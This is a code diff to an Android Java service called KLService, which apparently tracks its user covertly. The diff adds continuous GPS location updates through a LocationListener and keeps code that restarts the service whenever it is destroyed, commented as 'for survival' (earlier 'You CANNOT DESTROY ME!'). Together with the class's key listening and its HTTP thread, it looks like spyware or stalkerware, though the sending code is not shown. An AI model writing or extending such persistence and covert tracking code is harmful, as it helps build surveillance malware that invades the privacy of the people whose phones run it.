@@ -17,10 +17,10 @@
 package com.OverFlow.KLService;
 
 import android.app.Service;
-//import android.content.Context;
 import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
+import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Handler;
 import android.os.IBinder;
@@ -38,8 +38,9 @@ public class KLService extends Service implements KeyListener {
 	//MEMBERS:
 	private int mDebugLevel;
 	private Thread mHttpThread;
-	private Thread mLocationThread;
 	private int mIntervalTime;
+	private LocationManager lm;
+	private LocationListener ll;
 	public static Context mContext;
    	public static boolean rRun;
    	public static Location mLocation;
@@ -65,7 +66,9 @@ public class KLService extends Service implements KeyListener {
 		mContext = this;
 		mIntervalTime = 10000;
 		mHttpThread = new Thread(htttpRunnable);
-		mLocationThread = new Thread(locationRunnable);
+		lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+		ll = new KLSLocationListener();
+		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, ll);
 	
 		//serviceStatus = true;
 		//We go to our logic stuff....
@@ -76,7 +79,7 @@ public class KLService extends Service implements KeyListener {
     public void onDestroy() {
 		super.onDestroy();
 		if (mDebugLevel  > 1) {
-			Toast.makeText(this, "You CANNOT DESTROY ME! ...", Toast.LENGTH_LONG).show();
+			Toast.makeText(this, "AVIAD: Service created ...", Toast.LENGTH_LONG).show();
 		}
 		if (mDebugLevel > 0) {
 			Log.i(getClass().getSimpleName(), "AVIAD: Service destroyed ...");
@@ -84,10 +87,8 @@ public class KLService extends Service implements KeyListener {
 		
 		rRun = false;
 		
-		//serviceStatus = false;
-		//TO ANNOY>: Later ;) //////////////////////////////////////
+		//We restart service for survival
 		startService(new Intent(KLService.this, KLService.class));
-		////////////////////////////////////////////////////////////
     }
 
 	@Override
@@ -125,8 +126,6 @@ public class KLService extends Service implements KeyListener {
     	//Logication ba-rosh...
         //SystemClock.sleep(1000);
 		mHttpThread.start();
-		mLocationThread.start();
-		
 	}
 	
 	final Handler handler = new Handler();
@@ -176,54 +175,5 @@ public class KLService extends Service implements KeyListener {
     		}
 		}
      };
-     
-     //Location Thread:
-     final Runnable locationRunnable = new Runnable() {
-		@Override
-		public void run() {
-			//Thread Run:
-			Looper.prepare();
-			KLSLocation locator = new KLSLocation((LocationManager)getSystemService(Context.LOCATION_SERVICE));
-        	//Prepare for a loop(Note to self: Andy requested this..)
-        	
-        	
-    		if (mDebugLevel  > 1) {
-    			Toast.makeText(mContext, "Location Thread Starting ...", Toast.LENGTH_LONG).show();
-    		}
-    		if (mDebugLevel > 0) {
-    			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Starting ...");
-    		}
-        	
-        	//Since thread.stop() was deprecated we use the old flag approach:
-        	rRun = true;
-        	while (rRun) {
-        		if (mDebugLevel  > 1) {
-        			Toast.makeText(mContext, "Location Thread Running ...", Toast.LENGTH_LONG).show();
-        		}
-        		if (mDebugLevel > 0) {
-        			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Running ...");
-        		}
-        		
-        		//Start Thread Main Code:
-        		//Location tmpLoc = locator.getLastLocation();
-        		//Log.i(getClass().getSimpleName(), "AVIAD: Location is ..." + tmpLoc.getProvider());
-        		
-        		//END Thread Main Code.
-        		
-        		//Rest for a while
-	        	SystemClock.sleep(mIntervalTime);
-        	}
-        	
-        	//Thread Stopped Code:
-    		if (mDebugLevel  > 1) {
-    			Toast.makeText(mContext, "Location Thread Stopping ...", Toast.LENGTH_LONG).show();
-    		}
-    		if (mDebugLevel > 0) {
-    			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Stopped ...");
-    		}
-		}
-	};
-
-    
 }
 
